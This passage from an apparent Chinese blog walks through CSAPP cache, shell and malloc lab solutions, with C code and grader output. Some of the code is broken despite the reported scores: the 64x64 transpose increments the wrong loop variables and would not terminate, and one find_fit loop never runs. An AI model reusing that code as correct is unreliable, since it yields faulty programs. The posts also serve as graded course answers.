为 0x0 的块，发现有，于是记一次 hit，同理 “S 18，1” 访问第 1 组且 tag 为 0x0 的块，同样找到了，记一次 hit。再之后，“L 110，1” 访问组 1 且 tag 为 0x1 的块，没找到，且组 1 已经满了（由于 E=1 表示每组容量上限为 1 个块），所以还要腾出一块，记一次 miss 和一次 eviction。后面的不再赘述，经过一条条指令的分析，虽然一条代码都还没有写，但可以说我们已经搞清楚 PartA 是怎么一回事儿了。 一些细节，PPT 已经帮我们处理好了，比如接收并处理指令参数的 optget，也可看 Example of Getopt (The GNU C Library)： 1234567891011121314151617181920212223242526while (-1 != (opt = getopt(argc, argv, &quot;hvs:E:b:t:&quot;))) { switch (opt) { case 'h': print_usage_info(); return -1; case 'v': v = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': t = optarg; break; default: printf(&quot;wrong argument\\n&quot;); print_usage_info(); return -1; } } 还有读取文件，我们需要读 t 参数指定的 trace 文件： 123456789101112131415FILE *pFile; pFile = fopen(t, &quot;r&quot;); char identifier; unsigned long address; int size; while (fscanf(pFile, &quot; %c %lx,%d&quot;, &amp;identifier, &amp;address, &amp;size) &gt; 0) { int hitsOld = hits, missesOld = misses, evictionsOld = evictions; switch (identifier) { case 'I': continue; break; ... }} 接着，我讲讲我的思路，首先通过参数 s、E、b 建立输入命令的缓存环境。对于每一组缓存块，我们用一个 LRU 队列去维持。当访问块时，会遇到三种情况：1）在指定缓存队列中找到块，记 hit；2）在指定缓存队列中没找到块，但队列空间有剩余（也就是小于 E），记 miss 并在队首插入当前块；3）没找到块，且队列已满，将队尾缓存块释放，再在队首插入当前块。由于是 LRU，我们每次都从队首开始遍历查找，按经验可以减少换出频率。 1234typedef struct block{ unsigned long tag; struct block *next;}Block; 然后是每个缓存块，我们需要设置两个参数，一个是 tag，用来判断是否是同一块；一个是 next，指向队列下一个缓存块。简单来说，我们将每个地址尾部拆分成组下标和块偏移两个部分，同一组的组下标都是一样的，但起始 tag 不一样，比如 “L 210，1” 里的 210 实际上是 0x1000010000，其中 0000 是块偏移，0001 是组下标，0x10 才是 tag，所以我们的每个块结构都要记录 tag 来判断是否是同一块。 1234[root@MiWiFi-R4A-srv cachelab-handout]# gcc csim.c cachelab.c -o csimbak[root@MiWiFi-R4A-srv cachelab-handout]# ./csimbak -s 2 -E 2 -b 3 -t traces/trans.tracev:0 s:2 E:2 b:3 t:traces/trans.tracehits:201 misses:37 evictions:29 除了 make，我们也可以单独编译成 csimbak（随便取的名哈）去测试执行指令，由于之前有用到 math 库的 pow 函数所以还加了参数 - ml，但后来都优化成了位运算，就不再需要了。第一行是我的中间打印结果，后一行是需要保留的。最后，再进一步优化代码细节，具体参考项目文件 csim.c。 值得一提的是，在写代码过程中，突然忘记 LRU 要将访问节点交换到最开始位置了，导致 debug 了半小时，其实之前整理思路时已经规划了要去做这个的。虽然最找到 bug，但这依然是一顿教训，以后千万不能无脑 debug 了，多分析多规划。 PartB lab 已经预设了缓存环境参数为 s=5，E=1，b=5，也就是 32 组，每组 1 块，每块 32 字节，由于 int 占 4 字节，因此 1 个块可以装 8 个整数。矩阵转置操作之所以要优化访问，是因为由于每组只有 1 块，当碰到 A[0][0] 翻转到 B[0][0] 时，二者对应到缓存中都是第 0 组，因此需要存取两次。而当访问到下一个元素 A[0][1] 时，又要将旧块放回去，由于 miss 次数多导致频繁的换入换出，虚拟内存的实际性能也将大幅降低。因此，我们的任务表面上是降低矩阵转置的 miss 次数，实际上是在探究什么样的访存才是高性能的。文中还藏了一些我不知道算不算彩蛋的，比如 “column-wise scan”，“zig-zag access”，显然这二者都和原方法一样低效，因为换扫描方式是无法解决该问题的。 PPT 中提到的一种解决思路，就是分块方法。我们以 32x32 为例，将其分为 16 个 8x8 的正方形，为什么选 8 呢，因为题设环境一个块最多装 8 个整数。简单思考一下，A 的一个 8x8 正方形经过转置之后，这 64 个数字都恰好会放入 B 的某个 8x8 正方形中。 在最好情况下，比如左下角和右上角，我们可以同时装入 A 的 8 个块来载入其 64 个数字，和 B 的 8 个块，这 16 个块的组号都不一样，因此总共 miss 次数为 16。这意味只需要加载一次，理想情况下甚至只需要 256 次 miss 即可完成整个 32x32 的矩阵转置，另外该部分满分需要降低 miss 次数到 300 次以下。 但最坏情况下，比如同为对角线上的 8x8，假设我们在将 A[0][0] 传值给 B[0][0] 后，再去处理 A[0][1] 和 B[1][0] 的交换，会导致原本装 A[0][0] 的块反复换入换出。由于 lab 允许我们使用 12 个变量，因此我们可以考虑用变量将 A[0][0] ~ A[0][7] 记录下来，再传给 B，从而减少 miss 次数。当然，这样做依然无法做到最优，因为 B 的块仍然在被反复换入换出，不过比之前好多了，最终测试也的确小于 300 次。 12345678910111213141516171819202122232425void transpose_32_32(int M, int N, int A[N][M], int B[M][N]) { int v1, v2, v3, v4, v5, v6, v7, v8; for (int i = 0; i &lt; N; i += 8) { for (int j = 0; j &lt; M; j += 8) { for (int k = i; k &lt; i + 8 &amp;&amp; k &lt; N; k++) { v1 = A[k][j]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j][k] = v1; B[j + 1][k] = v2; B[j + 2][k] = v3; B[j + 3][k] = v4; B[j + 4][k] = v5; B[j + 5][k] = v6; B[j + 6][k] = v7; B[j + 7][k] = v8; } } }} 再考虑 64x64，如果我们依然按照 8x8 分块，那么会有一个问题，之前我们能成功是因为缓存有 32 组，具体到 32x32，每 8 行的元素行与行之间都不会发生组号冲突。但如果改成 64x64，不会发生组号冲突的行范围就缩小到了 4 行了。但如果我们按照 4x4 分块，那么又会浪费一半的块空间，比如读 A[0][0] 时，实际上 A[0][4] 也被换入了，但我们并没有使用它。因此，我们仍然采用 8x8，但是这个 8x8 实际上是由两个 4x8 拼凑而成的。 为了更好的理解，我将这个 8x8 块按照左上右上左下右下分为 abcd 四个区域。类似的，我们知道 A 的 abcd 四个区域翻转过后到 B 的 abcd 四个区域。更具体的说，A 转置到 B 的过程中，a 区域会翻转到 a 区域，b 区域会翻转到 c，而 c 会翻转到 b，d 区域翻转到 d 区域。这样，我们先读 A 的 a 和 b 区域（因为所属同一块），再放到 B 的 a 区域和 b 区域（暂存），然后再读 A 的 c 和 d 区域，再放到 B 的 c 和 d 区域。最后，将 B 的 b 区域和 c 区域交换。但是在交换 b 和 c 时必然遇到大量 miss，因此，思考无果参考了网上其他人的答案。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354void transpose_64_64(int M, int N, int A[N][M], int B[M][N]) { int v1, v2, v3, v4, v5, v6, v7, v8; for (int i = 0; i &lt; N; i++) { for (int j = 0; j &lt; M; j++) { // 处理 a 区域和 b 区域 for (int k = i; k &lt; i + 4; i++) { v1 = A[k][j]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j][k] = v1; B[j + 1][k] = v2; B[j + 2][k] = v3; B[j + 3][k] = v4; B[j][k + 4] = v5; B[j + 1][k + 4] = v6; B[j + 2][k + 4] = v7; B[j + 3][k + 4] = v8; } // 处理 c 区域和 d 区域 for (int k = i + 4; k &lt; i + 8; i++) { v1 = A[k][j]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j + 4][k] = v1; B[j + 5][k] = v2; B[j + 6][k] = v3; B[j + 7][k] = v4; B[j + 4][k + 4] = v5; B[j + 5][k + 4] = v6; B[j + 6][k + 4] = v7; B[j + 7][k + 4] = v8; } // 交换 B 的 b 区域和 c 区域 for (int k = 0; k &lt; 4; k++) { for (int l = 0; l &lt; 4; l++) { v1 = B[j + k + 4][i + l]; B[j + k + 4][i + l] = B[j + k][i + l + 4]; B[j + k][i + l + 4] = v1; } } } } 最后考虑 61x67，事实上我并没什么思路，考虑到之前因为对角线优化 32x32，这次直接裸上一个 8x8 方格，事实证明不行。然后又测试了 16x16，32x32，发现朴素的 16x16 也能直接降到 2000 以下。但别的优化手段，确实是没有了。 1234567891011void transpose_61_67(int M, int N, int A[N][M], int B[M][N]) { for (int i = 0; i &lt; N; i += 16) { for (int j = 0; j &lt; M; j += 16) { for (int k = i; k &lt; i + 16 &amp;&amp; k &lt; N; k++) { for (int l = j; l &lt; j + 16 &amp;&amp; l &lt; M; l++) { B[l][k] = A[k][l]; } } } }} 在做 partB 的时候，可以用 test-trans 测试： 1234567891011[root@MiWiFi-R4A-srv cachelab-handout]# ./test-trans -M 32 -N 32Function 0 (5 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 0 (Transpose submission): hits:1765, misses:288, evictions:256Function 1 (5 total)Step 1: Validating and generating memory tracesStep 2: Evaluating performance (s=5, E=1, b=5)func 1 (Simple row-wise scan transpose): hits:869, misses:1184, evictions:1152 最后，利用 driver.py 测试评分： 123456789101112131415161718192021222324252627[root@MiWiFi-R4A-srv cachelab-handout]# /usr/local/bin/python2.7 ./driver.pyPart A: Testing cache simulatorRunning ./test-csim Your simulator Reference simulatorPoints (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27Part B: Testing transpose functionRunning ./test-trans -M 32 -N 32Running ./test-trans -M 64 -N 64Running ./test-trans -M 61 -N 67Cache Lab summary: Points Max pts MissesCsim correctness 27.0 27Trans perf 32x32 8.0 8 288Trans perf 64x64 8.0 8 1180Trans perf 61x67 10.0 10 1993 Total points 53.0 53 注意，这里要用 python2。现在 python3.11 都出来了，而且 centos 默认安装 python3，所以要想使用 python2 必须专门去下载安装包了，下载安装过程我主要参考了 How To Install Python 2.7.16 on CentOS/RHEL 7/6 and Fedora 30-25 (tecadmin.net)，之后就可以用了： 1[root@MiWiFi-R4A-srv cachelab-handout]# /usr/local/bin/python2.7 ./driver.py 参考： CSAPP 实验之 cache lab - 知乎 (zhihu.com)","link":"/2022/06/05/CSAPP-LAB-5/"},{"title":"CSAPP Lab6 Writing Your Own Unix Shell","text":"准备 除了看 shlab.dvi (cmu.edu) 和 Introduction to Computer Systems 15-213/18-243, spring 2009 (cmu.edu) 外，这个实验还需要仔细阅读书上第八章异常控制流部分，而书中未补全代码可在 csapp.cs.cmu.edu/3e/ics3/code/src/csapp.c 搜索（比如 Kill）。 由于我基本是按照书上介绍内容照葫芦画瓢，实际的个人思考很少，个人认为比较重要的点是对照 tshref.out（也可以用 make rtestx 输出）差异去不断修改。具体来说，我们按照原代码框架顺序编写 eval、builtin_cmd、do_bgfg、waitfg 和另外 3 个 handler 即可。 另外值得注意的是很多特殊变量不需要我们定义，比如 SIGCONT，我的错误示范： 12/* signal.h 中未定义信号 */#define SIGCONT 18 /* 用在 bg 和 fg 指令 */ eval、builtin_cmd、do_bgfg、waitfg eval 部分代码直接参照 8-24，而其中锁的部分参考 8.5.4 和 8-40，lab 在 Hints 中也有提到需要在 fork 子进程前用 sigprocmask 锁住 SIGCHLD 信号，防止子进程提前终止导致父进程添加僵尸进程。当然，这里一开始我是完全没考虑并发冲突之类的。 1234567891011121314151617181920212223242526272829303132333435363738394041void eval(char *cmdline) { char *argv[MAXARGS]; char buf[MAXLINE]; int bg; pid_t pid; strcpy(buf, cmdline); bg = parseline(buf, argv); // 输入空命令行 if (argv[0] == NULL) return; sigset_t mask_all, mask_one, prev_one; Sigfillset(&amp;mask_all); Sigemptyset(&amp;mask_one); Sigaddset(&amp;mask_one, SIGCHLD); if (!builtin_cmd(argv)) { Sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); if ((pid = Fork()) == 0) { Sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); Setpgid(0, 0); Execve(argv[0], argv, environ); } // 添加子任务到 jobs Sigprocmask(SIG_BLOCK, &amp;mask_all, NULL); int state = bg ? BG : FG; addjob(jobs, pid, state, cmdline); Sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); // 解锁 // 父进程等待前台 job 终止 if (!bg) { waitfg(pid); } else { printf(&quot;[%d] (%d) %s&quot;, pid2jid(pid), pid, cmdline); } } return;} 然后，编写 buildtin_cmd，注意这个方法属于主线程，因此我们用 exit (0) 可以跳出循环安全退出，当然具体代码参照 8-24 编写即可。 1234567891011121314151617181920int builtin_cmd(char **argv) { // quit if (!strcmp(argv[0], &quot;quit&quot;)) { exit(0); } // jobs if (!strcmp(argv[0], &quot;jobs&quot;)) { listjobs(jobs); return 1; } // bg | fg &lt;job&gt; if (!strcmp(argv[0], &quot;bg&quot;) || !strcmp(argv[0], &quot;fg&quot;)) { do_bgfg(argv); return 1; } return 0; /* not a builtin command */} 在编写 do_bgfg 的时候，要注意和参考输出做对比，这里我推荐 test15，基本囊括了所有情况： 123456789101112131415161718192021222324252627282930313233343536373839404142434445void do_bgfg(char **argv) { int bg = !strcmp(argv[0], &quot;bg&quot;); if (argv[1] == NULL) { printf(&quot;%s command requires PID or %%jobid argument\\n&quot;, argv[0]); return; } pid_t pid; struct job_t *job; if (argv[1][0] == '%') { // job_id int jid = atoi(argv[1] + 1); if (jid == 0) { printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;, argv[0]); return; } if ((job = getjobjid(jobs, jid)) == NULL) { printf(&quot;%s: No such job\\n&quot;, argv[1]); return; } pid = job-&gt;pid; } else { // pid pid = atoi(argv[1]); if (pid == 0) { printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;, argv[0]); return; } if ((job = getjobpid(jobs, pid)) == NULL) { printf(&quot;(%s): No such process\\n&quot;, argv[1]); return; } } Kill(-pid, SIGCONT); if (bg) { job-&gt;state = BG; printf(&quot;[%d] (%d) %s&quot;, job-&gt;jid, pid, job-&gt;cmdline); } else { job-&gt;state = FG; waitfg(pid); }} waitfg 我是参考 8.5.7，循环阻塞式检测是否还有前台任务。 1234567void waitfg(pid_t pid) { sigset_t mask; Sigemptyset(&amp;mask); while (fgpid(jobs) != 0) { sigsuspend(&amp;mask); }} Signal handlers 我们创建的任务会有多种运行场景，收到信号 SIGINT 强制进程结束（键入 ctrl+c 也可以发出相同信号），收到 SIGSTOP 或者 SIGTSTP（等效于 ctrl+z）而暂停进程，后两者本质差不多，但还是有区别 unix - What is the difference between SIGSTOP and SIGTSTP? - Stack Overflow。当然我们需要发送的另一个指令 SIGCONT 可以让暂停进程继续运行，通常和 SIGSTOP 成对出现。 理解了信号的使用后，再借助 8.4.3 的内容，我们可以用信号去结束、回收、重启我们的子进程： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void sigchld_handler(int sig) { int olderrno = errno, status; pid_t pid; sigset_t mask_all, prev_all; Sigfillset(&amp;mask_all); while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) { Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); if (WIFEXITED(status)) { // 正常返回 deletejob(jobs, pid); } else if (WIFSIGNALED(status)) { // TSTP printf(&quot;Job [%d] (%d) terminated by signal %d\\n&quot;, pid2jid(pid), pid, WTERMSIG(status)); deletejob(jobs, pid); } else if (WIFSTOPPED(status)) { // STOP printf(&quot;Job [%d] (%d) stopped by signal %d\\n&quot;, pid2jid(pid), pid, WSTOPSIG(status)); struct job_t *job = getjobpid(jobs, pid); job-&gt;state = ST; } Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL); } errno = olderrno;} void sigint_handler(int sig) { pid_t pid; sigset_t mask_all, prev_all; Sigfillset(&amp;mask_all); Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); if ((pid = fgpid(jobs)) &gt; 0) { Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL); Kill(-pid, SIGINT); }}void sigtstp_handler(int sig) { pid_t pid; sigset_t mask_all, prev_all; Sigfillset(&amp;mask_all); Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); if ((pid = fgpid(jobs)) &gt; 0) { Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL); Kill(-pid, SIGTSTP); }} 收官~","link":"/2022/06/06/CSAPP-LAB-6/"},{"title":"CSAPP Lab7 Writing a Dynamic Storage Allocator","text":"准备 首先，在 linux 环境下解压，由于在 make 过程中发现缺少 glibc 的库，所以还要安装相关包： 1234[root@MiWiFi-R4A-srv malloclab-handout]# tar xvf malloclab-handout.tar[root@MiWiFi-R4A-srv malloclab-handout]# cd malloclab-handout/[root@MiWiFi-R4A-srv malloclab-handout]# yum install glibc-devel.i686[root@MiWiFi-R4A-srv malloclab-handout]# yum install libstdc++-devel.i686 lab 缺少 trace 文件，可自行下载 CSAPP-Lab/initial_labs/08_Malloc Lab/traces at master · Deconx/CSAPP-Lab (github.com) 。然后，详读 malloclab.dvi (cmu.edu) 和书上 9.9 节。 思路和过程 众所周知，由于通常是等程序实际运行时，我们才知道数据结构的实际大小，所以需要动态内存来专门维护进程的虚拟内存的。动态内存的分配方式主要有两种：类似于 C 中 malloc 包这种显式分配和 Java 中垃圾收集器这种隐式分配，当然在这个 lab 中我们主要考虑前者。 为了设计好这个分配器，我们需要阅读和掌握 malloc、sbrk、free 等函数，这里我主要参考书上介绍内容和 Memory Allocation and C (The GNU C Library)。简单来说，malloc 返回一个 size 大小的可用块，sbrk 直接扩展收缩堆并返回旧 brk（这里可以参考 memlib.c），而 free 则是对指针有要求。 我们使用的隐式空闲链表中的每个块主要由四个部分组成，头部、有效载荷、填充字段（可选）和尾部，其中头部尾部是 knuth 提出以便于边界判定从而快速追溯和合并连续空闲块。在采用双字对齐时，块的大小是 8 的倍数（默认一个字 4 字节，也就是 32bit，双字就是 64bit）。因此块头虽然表示块大小，但后 3 位实际上是无用的（因为有效大小应是 8 的倍数），所以直接用它来表示附加信息，比如用最后一位表示块是否空闲，在 PPT 中也有其他用法。 1234567/* 从一个字中读出块长和分配位，和 PACK 对应 */#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1)/* 通过块指针得到该块头部和脚部地址 */#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) 当一个块被释放时，就会涉及空闲块合并，可分为 4 种情况 afa、aff、ffa 和 fff。在编码过程中应注意，块指针指向的是第一个有效载荷字节地址，当然如果有效载荷为空则指向尾部。当堆被初始化时或者当分配函数无法找到一个合适的匹配块时，就会拓展堆。mem_sbrk 每次调用都返回一个块，由于 bp 指向的是结尾块（就是那个 0/1 块），因此结尾块成了新的头部，并设置为空闲。注意啊，这个 sbrk 其实只返回了一个双字对齐的内存片段，它一个部分成了新块的载荷和尾部，还有一部分成了新的结尾块。再之后，拓展完新块会遇到最后一个分配块为空闲的情况，所以拓展堆后还需要将二者合并。 堆在初始化时需要四个字，其中第二个字和第三个字构成起始块（载荷为 0），第四个字构成结尾块。之后让头指针就指向起始块，后面我们采用邻近适配法时新指针也指向这个块。 测试前，我们需要在 config.h 中为自己 tracefiles 文件夹的路径设置 TRACEDIR，然后 make 执行即可： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost malloclab-handout]# make &amp;&amp; ./mdriver -Vmake: “mdriver”已是最新。Team Name:H.Z.N.Member 1 :Zion Huang:zion@abc.comUsing default tracefiles in /mnt/hgfs/csapp/malloclab-handout/tracefiles/Measuring performance with gettimeofday().Testing mm mallocReading tracefile: amptjp-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: cccp-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: cp-decl-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: expr-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: coalescing-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: random-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: random2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: binary-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: binary2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: realloc-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: realloc2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Results for mm malloc:trace valid util ops secs Kops 0 yes 99% 5694 0.006877 828 1 yes 99% 5848 0.006181 946 2 yes 99% 6648 0.010611 626 3 yes 100% 5380 0.007164 751 4 yes 66% 14400 0.000089161435 5 yes 92% 4800 0.006173 778 6 yes 92% 4800 0.005336 900 7 yes 55% 12000 0.128997 93 8 yes 51% 24000 0.233592 103 9 yes 27% 14401 0.043192 33310 yes 34% 14401 0.001473 9780Total 74% 112372 0.449685 250Perf index = 44 (util) + 17 (thru) = 61/100 动态内存分配也有多种方式，包括首次适配、最佳适配、最差适配和下次适配，我们仿照课本代码实现的是一个典型的首次适配算法，用下次适配法，可以得到： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@localhost malloclab-handout]# make &amp;&amp; ./mdriver -Vgcc -Wall -O2 -m32 -c -o mm.o mm.cgcc -Wall -O2 -m32 -o mdriver mdriver.o mm.o memlib.o fsecs.o fcyc.o clock.o ftimer.oTeam Name:H.Z.N.Member 1 :Zion Huang:zion@abc.comUsing default tracefiles in /mnt/hgfs/csapp/malloclab-handout/tracefiles/Measuring performance with gettimeofday().Testing mm mallocReading tracefile: amptjp-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: cccp-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: cp-decl-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: expr-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: coalescing-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: random-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: random2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: binary-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: binary2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: realloc-bal.repChecking mm_malloc for correctness, efficiency, and performance.Reading tracefile: realloc2-bal.repChecking mm_malloc for correctness, efficiency, and performance.Results for mm malloc:trace valid util ops secs Kops 0 yes 86% 5694 0.000073 78430 1 yes 90% 5848 0.000069 84265 2 yes 94% 6648 0.000082 80582 3 yes 95% 5380 0.000072 74412 4 yes 66% 14400 0.000081178882 5 yes 84% 4800 0.000667 7197 6 yes 82% 4800 0.001048 4582 7 yes 55% 12000 0.000088135747 8 yes 51% 24000 0.000146163934 9 yes 26% 14401 0.045631 31610 yes 34% 14401 0.001445 9966Total 69% 112372 0.049403 2275Perf index = 42 (util) + 40 (thru) = 82/100 这里是代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254/* * mm-naive.c - The fastest, least memory-efficient malloc package. * * In this naive approach, a block is allocated by simply incrementing * the brk pointer. A block is pure payload. There are no headers or * footers. Blocks are never coalesced or reused. Realloc is * implemented directly using mm_malloc and mm_free. * * NOTE TO STUDENTS: Replace this header comment with your own header * comment that gives a high level description of your solution. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &quot;mm.h&quot;#include &quot;memlib.h&quot;/* 操作空闲链表的基本定义和宏 */#define WSIZE 4 // 字长#define DSIZE 8 // 双字长#define CHUNKSIZE (1 &lt;&lt; 12) // 初始堆默认为 4kB，拓展堆也基于此#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))/* 打包块长和分配位到一个字，主要用在头部和脚部 */#define PACK(size, alloc) ((size) | (alloc))#define GET(p) (*(unsigned int *)(p))#define PUT(p, val) (*(unsigned int *)(p) = (val))/* 从一个字中读出块长和分配位，和 PACK 对应 */#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1)/* 通过块指针得到该块头部和脚部地址 */#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)/* 通过块指针得到前一块和后一块的块指针 */#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))static char *heap_listp;static char *heap_bp;static void *coalesce(void *bp) { size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); if (prev_alloc &amp;&amp; next_alloc) { // case 1 heap_bp = bp; return bp; } else if (prev_alloc &amp;&amp; !next_alloc) { size += GET_SIZE(HDRP(NEXT_BLKP(bp))); PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); } else if (!prev_alloc &amp;&amp; next_alloc) { size += GET_SIZE(HDRP(PREV_BLKP(bp))); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); } else { size += GET_SIZE(FTRP(NEXT_BLKP(bp))) + GET_SIZE(HDRP(PREV_BLKP(bp))); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); } heap_bp = bp; return bp;}static void *extend_heap(size_t words) { char *bp; size_t size; // 维持双字对齐 size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; if ((long) (bp = mem_sbrk(size)) == -1) { return NULL; } PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); return coalesce(bp);}static void *find_fit(size_t asize) { char *bp; for (bp = heap_bp; GET_SIZE(HDRP(bp)) != 0; bp = NEXT_BLKP(bp)) { if (GET_ALLOC(HDRP(bp)) == 0 &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { heap_bp = bp; return bp; } } for (bp = heap_bp; bp &lt; heap_bp; bp = NEXT_BLKP(bp)) { if (GET_ALLOC(HDRP(bp)) == 0 &amp;&amp; GET_SIZE(HDRP(bp)) &gt;= asize) { heap_bp = bp; return bp; } } return NULL;}static void place(void *bp, size_t asize) { // 剩余部分必须要超过 DSIZE 才切割 size_t origin = GET_SIZE(HDRP(bp)); size_t rest = origin - asize; if (rest &gt;= (2*DSIZE)) { PUT(HDRP(bp),PACK(asize,1)); PUT(FTRP(bp),PACK(asize,1)); PUT(HDRP(NEXT_BLKP(bp)),PACK(rest,0)); PUT(FTRP(NEXT_BLKP(bp)),PACK(rest,0)); } else { PUT(HDRP(bp),PACK(origin,1)); PUT(FTRP(bp),PACK(origin,1)); } heap_bp = bp;}/********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/team_t team = { /* Team name */ &quot;H.Z.N.&quot;, /* First member's full name */ &quot;Zion Huang&quot;, /* First member's email address */ &quot;zion@abc.com&quot;, /* Second member's full name (leave blank if none) */ &quot;&quot;, /* Second member's email address (leave blank if none) */ &quot;&quot;};/* single word (4) or double word (8) alignment */#define ALIGNMENT 8/* rounds up to the nearest multiple of ALIGNMENT */#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))/* * mm_init - initialize the malloc package. */int mm_init(void) { if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *) -1) return -1; PUT(heap_listp, 0); PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1)); PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1)); PUT(heap_listp + (3 * WSIZE), PACK(0, 1)); heap_listp += (2 * WSIZE); heap_bp = heap_listp; if (extend_heap(CHUNKSIZE / WSIZE) == NULL) { return -1; } return 0;}/* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */void *mm_malloc(size_t size) { size_t asize; // 真正的块大小需要包括头部脚部（1 DSIZE）和双字对齐的载荷 size_t extendsize; // 拓展堆大小（如果没匹配成功） char *bp; // 第一次申请 malloc if (heap_listp == 0) { mm_init(); } if (size == 0) return NULL; if (size &lt;= DSIZE) asize = DSIZE * 2; else asize = DSIZE * ((DSIZE + size + (DSIZE - 1)) / DSIZE); if ((bp = find_fit(asize)) != NULL) { place(bp, asize); return bp; } extendsize = MAX(asize, CHUNKSIZE); if ((bp = extend_heap(extendsize / WSIZE)) == NULL) return NULL; place(bp, asize); return bp;}/* * mm_free - Freeing a block does nothing. */void mm_free(void *ptr) { size_t size = GET_SIZE(HDRP(ptr)); 